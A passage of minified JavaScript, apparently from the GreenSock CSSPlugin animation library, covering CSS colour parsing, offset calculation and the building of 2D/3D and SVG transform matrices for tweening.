l.width*s/100;c[_?"width":"height"]=s+r}u.appendChild(L),o=parseFloat(L[_?"offsetWidth":"offsetHeight"]),u.removeChild(L),_&&"%"===r&&a.cacheWidths!==!1&&(l=u._gsCache=u._gsCache||{},l.time=h,l.width=100*(o/s)),0!==o||n||(o=$(t,i,s,r,!0))}return f?-o:o},H=B.calculateOffset=function(t,e,i){if("absolute"!==Q(t,"position",i))return 0;var s="left"===e?"Left":"Top",r=Q(t,"margin"+s,i);return t["offset"+s]-($(t,e,parseFloat(r),r.replace(T,""))||0)},K=function(t,e){var i,s,r,n={};if(e=e||Z(t,null))if(i=e.length)for(;--i>-1;)r=e[i],(-1===r.indexOf("-transform")||ke===r)&&(n[r.replace(S,O)]=e.getPropertyValue(r));else for(i in e)(-1===i.indexOf("Transform")||Pe===i)&&(n[i]=e[i]);else if(e=t.currentStyle||t.style)for(i in e)"string"==typeof i&&void 0===n[i]&&(n[i.replace(S,O)]=e[i]);return Y||(n.opacity=U(t)),s=Ne(t,e,!1),n.rotation=s.rotation,n.skewX=s.skewX,n.scaleX=s.scaleX,n.scaleY=s.scaleY,n.x=s.x,n.y=s.y,Re&&(n.z=s.z,n.rotationX=s.rotationX,n.rotationY=s.rotationY,n.scaleZ=s.scaleZ),n.filters&&delete n.filters,n},J=function(t,e,i,s,r){var n,a,o,l={},h=t.style;for(a in i)"cssText"!==a&&"length"!==a&&isNaN(a)&&(e[a]!==(n=i[a])||r&&r[a])&&-1===a.indexOf("Origin")&&("number"==typeof n||"string"==typeof n)&&(l[a]="auto"!==n||"left"!==a&&"top"!==a?""!==n&&"auto"!==n&&"none"!==n||"string"!=typeof e[a]||""===e[a].replace(y,"")?n:0:H(t,a),void 0!==h[a]&&(o=new pe(h,a,h[a],o)));if(s)for(a in s)"className"!==a&&(l[a]=s[a]);return{difs:l,firstMPT:o}},te={width:["Left","Right"],height:["Top","Bottom"]},ee=["marginLeft","marginRight","marginTop","marginBottom"],ie=function(t,e,i){var s=parseFloat("width"===e?t.offsetWidth:t.offsetHeight),r=te[e],n=r.length;for(i=i||Z(t,null);--n>-1;)s-=parseFloat(Q(t,"padding"+r[n],i,!0))||0,s-=parseFloat(Q(t,"border"+r[n]+"Width",i,!0))||0;return s},se=function(t,e){if("contain"===t||"auto"===t||"auto auto"===t)return t+" ";(null==t||""===t)&&(t="0 0");var i=t.split(" "),s=-1!==t.indexOf("left")?"0%":-1!==t.indexOf("right")?"100%":i[0],r=-1!==t.indexOf("top")?"0%":-1!==t.indexOf("bottom")?"100%":i[1];return null==r?r="center"===s?"50%":"0":"center"===r&&(r="50%"),("center"===s||isNaN(parseFloat(s))&&-1===(s+"").indexOf("="))&&(s="50%"),t=s+" "+r+(i.length>2?" "+i[2]:""),e&&(e.oxp=-1!==s.indexOf("%"),e.oyp=-1!==r.indexOf("%"),e.oxr="="===s.charAt(1),e.oyr="="===r.charAt(1),e.ox=parseFloat(s.replace(y,"")),e.oy=parseFloat(r.replace(y,"")),e.v=t),e||t},re=function(t,e){return"string"==typeof t&&"="===t.charAt(1)?parseInt(t.charAt(0)+"1",10)*parseFloat(t.substr(2)):parseFloat(t)-parseFloat(e)},ne=function(t,e){return null==t?e:"string"==typeof t&&"="===t.charAt(1)?parseInt(t.charAt(0)+"1",10)*parseFloat(t.substr(2))+e:parseFloat(t)},ae=function(t,e,i,s){var r,n,a,o,l,h=1e-6;return null==t?o=e:"number"==typeof t?o=t:(r=360,n=t.split("_"),l="="===t.charAt(1),a=(l?parseInt(t.charAt(0)+"1",10)*parseFloat(n[0].substr(2)):parseFloat(n[0]))*(-1===t.indexOf("rad")?1:F)-(l?0:e),n.length&&(s&&(s[i]=e+a),-1!==t.indexOf("short")&&(a%=r,a!==a%(r/2)&&(a=0>a?a+r:a-r)),-1!==t.indexOf("_cw")&&0>a?a=(a+9999999999*r)%r-(0|a/r)*r:-1!==t.indexOf("ccw")&&a>0&&(a=(a-9999999999*r)%r-(0|a/r)*r)),o=e+a),h>o&&o>-h&&(o=0),o},oe={aqua:[0,255,255],lime:[0,255,0],silver:[192,192,192],black:[0,0,0],maroon:[128,0,0],teal:[0,128,128],blue:[0,0,255],navy:[0,0,128],white:[255,255,255],fuchsia:[255,0,255],olive:[128,128,0],yellow:[255,255,0],orange:[255,165,0],gray:[128,128,128],purple:[128,0,128],green:[0,128,0],red:[255,0,0],pink:[255,192,203],cyan:[0,255,255],transparent:[255,255,255,0]},le=function(t,e,i){return t=0>t?t+1:t>1?t-1:t,0|255*(1>6*t?e+6*(i-e)*t:.5>t?i:2>3*t?e+6*(i-e)*(2/3-t):e)+.5},he=a.parseColor=function(t,e){var i,s,r,n,a,o,l,h,_,u,c;if(t)if("number"==typeof t)i=[t>>16,255&t>>8,255&t];else{if(","===t.charAt(t.length-1)&&(t=t.substr(0,t.length-1)),oe[t])i=oe[t];else if("#"===t.charAt(0))4===t.length&&(s=t.charAt(1),r=t.charAt(2),n=t.charAt(3),t="#"+s+s+r+r+n+n),t=parseInt(t.substr(1),16),i=[t>>16,255&t>>8,255&t];else if("hsl"===t.substr(0,3))if(i=c=t.match(d),e){if(-1!==t.indexOf("="))return t.match(g)}else a=Number(i[0])%360/360,o=Number(i[1])/100,l=Number(i[2])/100,r=.5>=l?l*(o+1):l+o-l*o,s=2*l-r,i.length>3&&(i[3]=Number(t[3])),i[0]=le(a+1/3,s,r),i[1]=le(a,s,r),i[2]=le(a-1/3,s,r);else i=t.match(d)||oe.transparent;i[0]=Number(i[0]),i[1]=Number(i[1]),i[2]=Number(i[2]),i.length>3&&(i[3]=Number(i[3]))}else i=oe.black;return e&&!c&&(s=i[0]/255,r=i[1]/255,n=i[2]/255,h=Math.max(s,r,n),_=Math.min(s,r,n),l=(h+_)/2,h===_?a=o=0:(u=h-_,o=l>.5?u/(2-h-_):u/(h+_),a=h===s?(r-n)/u+(n>r?6:0):h===r?(n-s)/u+2:(s-r)/u+4,a*=60),i[0]=0|a+.5,i[1]=0|100*o+.5,i[2]=0|100*l+.5),i},_e=function(t,e){var i,s,r,n=t.match(ue)||[],a=0,o=n.length?"":t;for(i=0;n.length>i;i++)s=n[i],r=t.substr(a,t.indexOf(s,a)-a),a+=r.length+s.length,s=he(s,e),3===s.length&&s.push(1),o+=r+(e?"hsla("+s[0]+","+s[1]+"%,"+s[2]+"%,"+s[3]:"rgba("+s.join(","))+")";return o},ue="(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#.+?\\b";for(h in oe)ue+="|"+h+"\\b";ue=RegExp(ue+")","gi"),a.colorStringFilter=function(t){var e,i=t[0]+t[1];ue.lastIndex=0,ue.test(i)&&(e=-1!==i.indexOf("hsl(")||-1!==i.indexOf("hsla("),t[0]=_e(t[0],e),t[1]=_e(t[1],e))},e.defaultStringFilter||(e.defaultStringFilter=a.colorStringFilter);var ce=function(t,e,i,s){if(null==t)return function(t){return t};var r,n=e?(t.match(ue)||[""])[0]:"",a=t.split(n).join("").match(v)||[],o=t.substr(0,t.indexOf(a[0])),l=")"===t.charAt(t.length-1)?")":"",h=-1!==t.indexOf(" ")?" ":",",_=a.length,u=_>0?a[0].replace(d,""):"";return _?r=e?function(t){var e,c,f,p;if("number"==typeof t)t+=u;else if(s&&M.test(t)){for(p=t.replace(M,"|").split("|"),f=0;p.length>f;f++)p[f]=r(p[f]);return p.join(",")}if(e=(t.match(ue)||[n])[0],c=t.split(e).join("").match(v)||[],f=c.length,_>f--)for(;_>++f;)c[f]=i?c[0|(f-1)/2]:a[f];return o+c.join(h)+h+e+l+(-1!==t.indexOf("inset")?" inset":"")}:function(t){var e,n,c;if("number"==typeof t)t+=u;else if(s&&M.test(t)){for(n=t.replace(M,"|").split("|"),c=0;n.length>c;c++)n[c]=r(n[c]);return n.join(",")}if(e=t.match(v)||[],c=e.length,_>c--)for(;_>++c;)e[c]=i?e[0|(c-1)/2]:a[c];return o+e.join(h)+l}:function(t){return t}},fe=function(t){return t=t.split(","),function(e,i,s,r,n,a,o){var l,h=(i+"").split(" ");for(o={},l=0;4>l;l++)o[t[l]]=h[l]=h[l]||h[(l-1)/2>>0];return r.parse(e,o,n,a)}},pe=(B._setPluginRatio=function(t){this.plugin.setRatio(t);for(var e,i,s,r,n=this.data,a=n.proxy,o=n.firstMPT,l=1e-6;o;)e=a[o.v],o.r?e=Math.round(e):l>e&&e>-l&&(e=0),o.t[o.p]=e,o=o._next;if(n.autoRotate&&(n.autoRotate.rotation=a.rotation),1===t)for(o=n.firstMPT;o;){if(i=o.t,i.type){if(1===i.type){for(r=i.xs0+i.s+i.xs1,s=1;i.l>s;s++)r+=i["xn"+s]+i["xs"+(s+1)];i.e=r}}else i.e=i.s+i.xs0;o=o._next}},function(t,e,i,s,r){this.t=t,this.p=e,this.v=i,this.r=r,s&&(s._prev=this,this._next=s)}),me=(B._parseToProxy=function(t,e,i,s,r,n){var a,o,l,h,_,u=s,c={},f={},p=i._transform,m=I;for(i._transform=null,I=e,s=_=i.parse(t,e,s,r),I=m,n&&(i._transform=p,u&&(u._prev=null,u._prev&&(u._prev._next=null)));s&&s!==u;){if(1>=s.type&&(o=s.p,f[o]=s.s+s.c,c[o]=s.s,n||(h=new pe(s,"s",o,h,s.r),s.c=0),1===s.type))for(a=s.l;--a>0;)l="xn"+a,o=s.p+"_"+l,f[o]=s.data[l],c[o]=s[l],n||(h=new pe(s,l,o,h,s.rxp[l]));s=s._next}return{proxy:c,end:f,firstMPT:h,pt:_}},B.CSSPropTween=function(t,e,s,r,a,o,l,h,_,u,c){this.t=t,this.p=e,this.s=s,this.c=r,this.n=l||e,t instanceof me||n.push(this.n),this.r=h,this.type=o||0,_&&(this.pr=_,i=!0),this.b=void 0===u?s:u,this.e=void 0===c?s+r:c,a&&(this._next=a,a._prev=this)}),de=function(t,e,i,s,r,n){var a=new me(t,e,i,s-i,r,-1,n);return a.b=i,a.e=a.xs0=s,a},ge=a.parseComplex=function(t,e,i,s,r,n,a,o,l,h){i=i||n||"",a=new me(t,e,0,0,a,h?2:1,null,!1,o,i,s),s+="";var u,c,f,p,m,v,y,T,x,w,b,P,k,S=i.split(", ").join(",").split(" "),R=s.split(", ").join(",").split(" "),O=S.length,A=_!==!1;for((-1!==s.indexOf(",")||-1!==i.indexOf(","))&&(S=S.join(" ").replace(M,", ").split(" "),R=R.join(" ").replace(M,", ").split(" "),O=S.length),O!==R.length&&(S=(n||"").split(" "),O=S.length),a.plugin=l,a.setRatio=h,ue.lastIndex=0,u=0;O>u;u++)if(p=S[u],m=R[u],T=parseFloat(p),T||0===T)a.appendXtra("",T,re(m,T),m.replace(g,""),A&&-1!==m.indexOf("px"),!0);else if(r&&ue.test(p))P=","===m.charAt(m.length-1)?"),":")",k=-1!==m.indexOf("hsl")&&Y,p=he(p,k),m=he(m,k),x=p.length+m.length>6,x&&!Y&&0===m[3]?(a["xs"+a.l]+=a.l?" transparent":"transparent",a.e=a.e.split(R[u]).join("transparent")):(Y||(x=!1),k?a.appendXtra(x?"hsla(":"hsl(",p[0],re(m[0],p[0]),",",!1,!0).appendXtra("",p[1],re(m[1],p[1]),"%,",!1).appendXtra("",p[2],re(m[2],p[2]),x?"%,":"%"+P,!1):a.appendXtra(x?"rgba(":"rgb(",p[0],m[0]-p[0],",",!0,!0).appendXtra("",p[1],m[1]-p[1],",",!0).appendXtra("",p[2],m[2]-p[2],x?",":P,!0),x&&(p=4>p.length?1:p[3],a.appendXtra("",p,(4>m.length?1:m[3])-p,P,!1))),ue.lastIndex=0;else if(v=p.match(d)){if(y=m.match(g),!y||y.length!==v.length)return a;for(f=0,c=0;v.length>c;c++)b=v[c],w=p.indexOf(b,f),a.appendXtra(p.substr(f,w-f),Number(b),re(y[c],b),"",A&&"px"===p.substr(w+b.length,2),0===c),f=w+b.length;a["xs"+a.l]+=p.substr(f)}else a["xs"+a.l]+=a.l?" "+p:p;if(-1!==s.indexOf("=")&&a.data){for(P=a.xs0+a.data.s,u=1;a.l>u;u++)P+=a["xs"+u]+a.data["xn"+u];a.e=P+a["xs"+u]}return a.l||(a.type=-1,a.xs0=a.e),a.xfirst||a},ve=9;for(h=me.prototype,h.l=h.pr=0;--ve>0;)h["xn"+ve]=0,h["xs"+ve]="";h.xs0="",h._next=h._prev=h.xfirst=h.data=h.plugin=h.setRatio=h.rxp=null,h.appendXtra=function(t,e,i,s,r,n){var a=this,o=a.l;return a["xs"+o]+=n&&o?" "+t:t||"",i||0===o||a.plugin?(a.l++,a.type=a.setRatio?2:1,a["xs"+a.l]=s||"",o>0?(a.data["xn"+o]=e+i,a.rxp["xn"+o]=r,a["xn"+o]=e,a.plugin||(a.xfirst=new me(a,"xn"+o,e,i,a.xfirst||a,0,a.n,r,a.pr),a.xfirst.xs0=0),a):(a.data={s:e+i},a.rxp={},a.s=e,a.c=i,a.r=r,a)):(a["xs"+o]+=e+(s||""),a)};var ye=function(t,e){e=e||{},this.p=e.prefix?W(t)||t:t,l[t]=l[this.p]=this,this.format=e.formatter||ce(e.defaultValue,e.color,e.collapsible,e.multi),e.parser&&(this.parse=e.parser),this.clrs=e.color,this.multi=e.multi,this.keyword=e.keyword,this.dflt=e.defaultValue,this.pr=e.priority||0},Te=B._registerComplexSpecialProp=function(t,e,i){"object"!=typeof e&&(e={parser:i});var s,r,n=t.split(","),a=e.defaultValue;for(i=i||[a],s=0;n.length>s;s++)e.prefix=0===s&&e.prefix,e.defaultValue=i[s]||a,r=new ye(n[s],e)},xe=function(t){if(!l[t]){var e=t.charAt(0).toUpperCase()+t.substr(1)+"Plugin";Te(t,{parser:function(t,i,s,r,n,a,h){var _=o.com.greensock.plugins[e];return _?(_._cssRegister(),l[s].parse(t,i,s,r,n,a,h)):(q("Error: "+e+" js file not loaded."),n)}})}};h=ye.prototype,h.parseComplex=function(t,e,i,s,r,n){var a,o,l,h,_,u,c=this.keyword;if(this.multi&&(M.test(i)||M.test(e)?(o=e.replace(M,"|").split("|"),l=i.replace(M,"|").split("|")):c&&(o=[e],l=[i])),l){for(h=l.length>o.length?l.length:o.length,a=0;h>a;a++)e=o[a]=o[a]||this.dflt,i=l[a]=l[a]||this.dflt,c&&(_=e.indexOf(c),u=i.indexOf(c),_!==u&&(-1===u?o[a]=o[a].split(c).join(""):-1===_&&(o[a]+=" "+c)));e=o.join(", "),i=l.join(", ")}return ge(t,this.p,e,i,this.clrs,this.dflt,s,this.pr,r,n)},h.parse=function(t,e,i,s,n,a){return this.parseComplex(t.style,this.format(Q(t,this.p,r,!1,this.dflt)),this.format(e),n,a)},a.registerSpecialProp=function(t,e,i){Te(t,{parser:function(t,s,r,n,a,o){var l=new me(t,r,0,0,a,2,r,!1,i);return l.plugin=o,l.setRatio=e(t,s,n._tween,r),l},priority:i})},a.useSVGTransformAttr=c||f;var we,be="scaleX,scaleY,scaleZ,x,y,z,skewX,skewY,rotation,rotationX,rotationY,perspective,xPercent,yPercent".split(","),Pe=W("transform"),ke=V+"transform",Se=W("transformOrigin"),Re=null!==W("perspective"),Oe=B.Transform=function(){this.perspective=parseFloat(a.defaultTransformPerspective)||0,this.force3D=a.defaultForce3D!==!1&&Re?a.defaultForce3D||"auto":!1},Ae=window.SVGElement,Ce=function(t,e,i){var s,r=E.createElementNS("http://www.w3.org/2000/svg",t),n=/([a-z])([A-Z])/g;for(s in i)r.setAttributeNS(null,s.replace(n,"$1-$2").toLowerCase(),i[s]);return e.appendChild(r),r},De=E.documentElement,Me=function(){var t,e,i,s=m||/Android/i.test(j)&&!window.chrome;return E.createElementNS&&!s&&(t=Ce("svg",De),e=Ce("rect",t,{width:100,height:50,x:100}),i=e.getBoundingClientRect().width,e.style[Se]="50% 50%",e.style[Pe]="scaleX(0.5)",s=i===e.getBoundingClientRect().width&&!(f&&Re),De.removeChild(t)),s}(),ze=function(t,e,i,s,r){var n,o,l,h,_,u,c,f,p,m,d,g,v,y,T=t._gsTransform,x=Ee(t,!0);T&&(v=T.xOrigin,y=T.yOrigin),(!s||2>(n=s.split(" ")).length)&&(c=t.getBBox(),e=se(e).split(" "),n=[(-1!==e[0].indexOf("%")?parseFloat(e[0])/100*c.width:parseFloat(e[0]))+c.x,(-1!==e[1].indexOf("%")?parseFloat(e[1])/100*c.height:parseFloat(e[1]))+c.y]),i.xOrigin=h=parseFloat(n[0]),i.yOrigin=_=parseFloat(n[1]),s&&x!==Ie&&(u=x[0],c=x[1],f=x[2],p=x[3],m=x[4],d=x[5],g=u*p-c*f,o=h*(p/g)+_*(-f/g)+(f*d-p*m)/g,l=h*(-c/g)+_*(u/g)-(u*d-c*m)/g,h=i.xOrigin=n[0]=o,_=i.yOrigin=n[1]=l),T&&(r||r!==!1&&a.defaultSmoothOrigin!==!1?(o=h-v,l=_-y,T.xOffset+=o*x[0]+l*x[2]-o,T.yOffset+=o*x[1]+l*x[3]-l):T.xOffset=T.yOffset=0),t.setAttribute("data-svg-origin",n.join(" "))},Fe=function(t){return!!(Ae&&"function"==typeof t.getBBox&&t.getCTM&&(!t.parentNode||t.parentNode.getBBox&&t.parentNode.getCTM))},Ie=[1,0,0,1,0,0],Ee=function(t,e){var i,s,r,n,a,o=t._gsTransform||new Oe,l=1e5;if(Pe?s=Q(t,ke,null,!0):t.currentStyle&&(s=t.currentStyle.filter.match(C),s=s&&4===s.length?[s[0].substr(4),Number(s[2].substr(4)),Number(s[1].substr(4)),s[3].substr(4),o.x||0,o.y||0].join(","):""),i=!s||"none"===s||"matrix(1, 0, 0, 1, 0, 0)"===s,(o.svg||t.getBBox&&Fe(t))&&(i&&-1!==(t.style[Pe]+"").indexOf("matrix")&&(s=t.style[Pe],i=0),r=t.getAttribute("transform"),i&&r&&(-1!==r.indexOf("matrix")?(s=r,i=0):-1!==r.indexOf("translate")&&(s="matrix(1,0,0,1,"+r.match(/(?:\-|\b)[\d\-\.e]+\b/gi).join(",")+")",i=0))),i)return Ie;for(r=(s||"").match(/(?:\-|\b)[\d\-\.e]+\b/gi)||[],ve=r.length;--ve>-1;)n=Number(r[ve]),r[ve]=(a=n-(n|=0))?(0|a*l+(0>a?-.5:.5))/l+n:n;return e&&r.length>6?[r[0],r[1],r[4],r[5],r[12],r[13]]:r},Ne=B.getTransform=function(t,i,s,n){if(t._gsTransform&&s&&!n)return t._gsTransform;var o,l,h,_,u,c,f=s?t._gsTransform||new Oe:new Oe,p=0>f.scaleX,m=2e-5,d=1e5,g=Re?parseFloat(Q(t,Se,i,!1,"0 0 0").split(" ")[2])||f.zOrigin||0:0,v=parseFloat(a.defaultTransformPerspective)||0;if(f.svg=!(!t.getBBox||!Fe(t)),f.svg&&(ze(t,Q(t,Se,r,!1,"50% 50%")+"",f,t.getAttribute("data-svg-origin")),we=a.useSVGTransformAttr||Me),o=Ee(t),o!==Ie){if(16===o.length){var y,T,x,w,b,P=o[0],k=o[1],S=o[2],R=o[3],O=o[4],A=o[5],C=o[6],D=o[7],M=o[8],z=o[9],I=o[10],E=o[12],N=o[13],L=o[14],X=o[11],B=Math.atan2(C,I);f.zOrigin&&(L=-f.zOrigin,E=M*L-o[12],N=z*L-o[13],L=I*L+f.zOrigin-o[14]),f.rotationX=B*F,B&&(w=Math.cos(-B),b=Math.sin(-B),y=O*w+M*b,T=A*w+z*b,x=C*w+I*b,M=O*-b+M*w,z=A*-b+z*w,I=C*-b+I*w,X=D*-b+X*w,O=y,A=T,C=x),B=Math.atan2(M,I),f.rotationY=B*F,B&&(w=Math.cos(-B),b=Math.sin(-B),y=P*w-M*b,T=k*w-z*b,x=S*w-I*b,z=k*b+z*w,I=S*b+I*w,X=R*b+X*w,P=y,k=T,S=x),B=Math.atan2(k,P),f.rotation=B*F,B&&(w=Math.cos(-B),b=Math.sin(-B),P=P*w+O*b,T=k*w+A*b,A=k*-b+A*w,C=S*-b+C*w,k=T),f.rotationX&&Math.abs(f.rotationX)+Math.abs(f.rotation)>359.9&&(f.rotationX=f.rotation=0,f.rotationY+=180),f.scaleX=(0|Math.sqrt(P*P+k*k)*d+.5)/d,f.scaleY=(0|Math.sqrt(A*A+z*z)*d+.5)/d,f.scaleZ=(0|Math.sqrt(C*C+I*I)*d+.5)/d,f.skewX=0,f.perspective=X?1/(0>X?-X:X):0,f.x=E,f.y=N,f.z=L,f.svg&&(f.x-=f.xOrigin-(f.xOrigin*P-f.yOrigin*O),f.y-=f.yOrigin-(f.yOrigin*k-f.xOrigin*A))}else if(!(Re&&!n&&o.length&&f.x===o[4]&&f.y===o[5]&&(f.rotationX||f.rotationY)||void 0!==f.x&&"none"===Q(t,"display",i))){var j=o.length>=6,Y=j?o[0]:1,U=o[1]||0,q=o[2]||0,V=j?o[3]:1;f.x=o[4]||0,f.y=o[5]||0,h=Math.sqrt(Y*Y+U*U),_=Math.sqrt(V*V+q*q),u=Y||U?Math.atan2(U,Y)*F:f.rotation||0,c=q||V?Math.atan2(q,V)*F+u:f.skewX||0,Math.abs(c)>90&&270>Math.abs(c)&&(p?(h*=-1,c+=0>=u?180:-180,u+=0>=u?180:-180):(_*=-1,c+=0>=c?180:-180)),f.scaleX=h,f.scaleY=_,f.rotation=u,f.skewX=c,Re&&(f.rotationX=f.rotationY=f.z=0,f.perspective=v,f.scaleZ=1),f.svg&&(f.x-=f.xOrigin-(f.xOrigin*Y+f.yOrigin*q),f.y-=f.yOrigin-(f.xOrigin*U+f.yOrigin*V))}f.zOrigin=g;for(l in f)m>f[l]&&f[l]>-m&&(f[l]=0)}return s&&(t._gsTransform=f,f.svg&&(we&&t.style[Pe]?e.delayedCall(.001,function(){je(t.style,Pe)}):!we&&t.getAttribute("transform")&&e.delayedCall(.001,function(){t.removeAttribute("transform")}))),f},Le=function(t){var e,i,s=this.data,r=-s.rotation*z,n=r+s.skewX*z,a=1e5,o=(0|Math.cos(r)*s.scaleX*a)/a,l=(0|Math.sin(r)*s.scaleX*a)/a,h=(0|Math.sin(n)*-s.scaleY*a)/a,_=(0|Math.cos(n)*s.scaleY*a)/a,u=this.t.style,c=this.t.currentStyle;if(c){i=l,l=-h,h=-i,e=c.filter,u.filter="";var f,p,d=this.t.offsetWidth,g=this.t.offsetHeight,v="absolute"!==c.position,y="progid:DXImageTransform.Microsoft.Matrix(M11="+o+", M12="+l+", M21="+h+", M22="+_,w=s.x+d*s.xPercent/100,b=s.y+g*s.yPercent/100;if(null!=s.ox&&(f=(s.oxp?.01*d*s.ox:s.ox)-d/2,p=(s.oyp?.01*g*s.oy:s.oy)-g/2,w+=f-(f*o+p*l),b+=p-(f*h+p*_)),v?(f=d/2,p=g/2,y+=", Dx="+(f-(f*o+p*l)+w)+", Dy="+(p-(f*h+p*_)+b)+")"):y+=", sizingMethod='auto expand')",u.filter=-1!==e.indexOf("DXImageTransform.Microsoft.Matrix(")?e.replace(D,y):y+" "+e,(0===t||1===t)&&1===o&&0===l&&0===h&&1===_&&(v&&-1===y.indexOf("Dx=0, Dy=0")||x.test(e)&&100!==parseFloat(RegExp.$1)||-1===e.indexOf("gradient("&&e.indexOf("Alpha"))&&u.removeAttribute("filter")),!v){var P,k,S,R=8>m?1:-1;for(f=s.ieOffsetX||0,p=s.ieOffsetY||0,s.ieOffsetX=Math.round((d-((0>o?-o:o)*d+(0>l?-l:l)*g))/2+w),s.ieOffsetY=Math.round((g-((0>_?-_:_)*g+(0>h?-h:h)*d))/2+b),ve=0;4>ve;ve++)k=ee[ve],P=c[k],i=-1!==P.indexOf("px")?parseFloat(P):$(this.t,k,parseFloat(P),P.replace(T,""))||0,S=i!==s[k]?2>ve?-s.ieOffsetX:-s.ieOffsetY:2>ve?f-s.ieOffsetX:p-s.ieOffsetY,u[k]=(s[k]=Math.round(i-S*(0===ve||2===ve?1:R)))+"px"}}},Xe=B.set3DTransformRatio=B.setTransformRatio=function(t){var e,i,s,r,n,a,o,l,h,_,u,c,p,m,d,g,v,y,T,x,w,b,P,k=this.data,S=this.t.style,R=k.rotation,O=k.rotationX,A=k.rotationY,C=k.scaleX,D=k.scaleY,M=k.scaleZ,F=k.x,I=k.y,E=k.z,N=k.svg,L=k.perspective,X=k.force3D;if(!(((1!==t&&0!==t||"auto"!==X||this.tween._totalTime!==this.tween._totalDuration&&this.tween._totalTime)&&X||E||L||A||O)&&(!we||!N)&&Re))return R||k.skewX||N?(R*=z,b=k.skewX*z,P=1e5,e=Math.cos(R)*C,r=Math.sin(R)*C,i=Math.sin(R-b)*-D,n=Math.cos(R-b)*D,b&&"simple"===k.skewType&&(v=Math.tan(b),v=Math.sqrt(1+v*v),i*=v,n*=v,k.skewY&&(e*=v,r*=v)),N&&(F+=k.xOrigin-(k.xOrigin*e+k.yOrigin*i)+k.xOffset,I+=k.yOrigin-(k.xOrigin*r+k.yOrigin*n)+k.yOffset,we&&(k.xPercent||k.yPercent)&&(m=this.t.getBBox(),F+=.01*k.xPercent*m.width,I+=.01*k.yPercent*m.height),m=1e-6,m>F&&F>-m&&(F=0),m>I&&I>-m&&(I=0)),T=(0|e*P)/P+","+(0|r*P)/P+","+(0|i*P)/P+","+(0|n*P)/P+","+F+","+I+")",N&&we?this.t.setAttribute("transform","matrix("+T):S[Pe]=(k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) matrix(":"matrix(")+T):S[Pe]=(k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) matrix(":"matrix(")+C+",0,0,"+D+","+F+","+I+")",void 0;if(f&&(m=1e-4,m>C&&C>-m&&(C=M=2e-5),m>D&&D>-m&&(D=M=2e-5),!L||k.z||k.rotationX||k.rotationY||(L=0)),R||k.skewX)R*=z,d=e=Math.cos(R),g=r=Math.sin(R),k.skewX&&(R-=k.skewX*z,d=Math.cos(R),g=Math.sin(R),"simple"===k.skewType&&(v=Math.tan(k.skewX*z),v=Math.sqrt(1+v*v),d*=v,g*=v,k.skewY&&(e*=v,r*=v))),i=-g,n=d;else{if(!(A||O||1!==M||L||N))return S[Pe]=(k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) translate3d(":"translate3d(")+F+"px,"+I+"px,"+E+"px)"+(1!==C||1!==D?" scale("+C+","+D+")":""),void 0;e=n=1,i=r=0}h=1,s=a=o=l=_=u=0,c=L?-1/L:0,p=k.zOrigin,m=1e-6,x=",",w="0",R=A*z,R&&(d=Math.cos(R),g=Math.sin(R),o=-g,_=c*-g,s=e*g,a=r*g,h=d,c*=d,e*=d,r*=d),R=O*z,R&&(d=Math.cos(R),g=Math.sin(R),v=i*d+s*g,y=n*d+a*g,l=h*g,u=c*g,s=i*-g+s*d,a=n*-g+a*d,h*=d,c*=d,i=v,n=y),1!==M&&(s*=M,a*=M,h*=M,c*=M),1!==D&&(i*=D,n*=D,l*=D,u*=D),1!==C&&(e*=C,r*=C,o*=C,_*=C),(p||N)&&(p&&(F+=s*-p,I+=a*-p,E+=h*-p+p),N&&(F+=k.xOrigin-(k.xOrigin*e+k.yOrigin*i)+k.xOffset,I+=k.yOrigin-(k.xOrigin*r+k.yOrigin*n)+k.yOffset),m>F&&F>-m&&(F=w),m>I&&I>-m&&(I=w),m>E&&E>-m&&(E=0)),T=k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) matrix3d(":"matrix3d(",T+=(m>e&&e>-m?w:e)+x+(m>r&&r>-m?w:r)+x+(m>o&&o>-m?w:o),T+=x+(m>_&&_>-m?w:_)+x+(m>i&&i>-m?w:i)+x+(m>n&&n>-m?w:n),O||A?(T+=x+(m>l&&l>-m?w:l)+x+(m>u&&u>-m?w:u)+x+(m>s&&s>-m?w:s),T+=x+(m>a&&a>-m?w:a)+x+(m>h&&h>-m?w:h)+x+(m>c&&c>-m?w:c)+x):T+=",0,0,0,0,1,0,",T+=F+x+I+x+E+x+(L?1+-E/L:1)+")",S[Pe]=T};h=Oe.prototype,h.x=h.y=h.z=h.skewX=h.skewY=h.rotation=h.rotationX=h.rotationY=h.zOrigin=h.xPercent=h.yPercent=h.xOffset=h.yOffset=0,h.scaleX=h.scaleY=h.scaleZ=1,Te("transform,scale,scaleX,scaleY,scaleZ,x,y,z,rotation,rotationX,rotationY,rotationZ,skewX,skewY,shortRotation,shortRotationX,shortRotationY,shortRotationZ,transformOrigin,svgOrigin,transformPerspective,directionalRotation,parseTransform,force3D,skewType,xPercent,yPercent,smoothOrigin",{parser:function(t,e,i,s,n,o,l){if(s._lastParsedTransform===l)return n;s._lastParsedTransform=l;var h,_,u,c,f,p,m,d,g,v,y=t._gsTransform,T=t.style,x=1e-6,w=be.length,b=l,P={},k="transformOrigin";if(l.display?(c=Q(t,"display"),T.display="block",h=Ne(t,r,!0,l.parseTransform),T.display=c):h=Ne(t,r,!0,l.parseTransform),s._transform=h,"string"==typeof b.transform&&Pe)c=L.style,c[Pe]=b.transform,c.display="block",c.position="absolute",E.body.appendChild(L),_=Ne(L,null,!1),E.body.removeChild(L),_.perspective||(_.perspective=h.perspective),null!=b.xPercent&&(_.xPercent=ne(b.xPercent,h.xPercent)),null!=b.yPercent&&(_.yPercent=ne(b.yPercent,h.yPercent));else if("object"==typeof b){if(_={scaleX:ne(null!=b.scaleX?b.scaleX:b.scale,h.scaleX),scaleY:ne(null!=b.scaleY?b.scaleY:b.scale,h.scaleY),scaleZ:ne(b.scaleZ,h.scaleZ),x:ne(b.x,h.x),y:ne(b.y,h.y),z:ne(b.z,h.z),xPercent:ne(b.xPercent,h.xPercent),yPercent:ne(b.yPercent,h.yPercent),perspective:ne(b.transformPerspective,h.perspective)},d=b.directionalRotation,null!=d)if("object"==typeof d)for(c in d)b[c]=d[c];else b.rotation=d;"string"==typeof b.x&&-1!==b.x.indexOf("%")&&(_.x=0,_.xPercent=ne(b.x,h.xPercent)),"string"==typeof 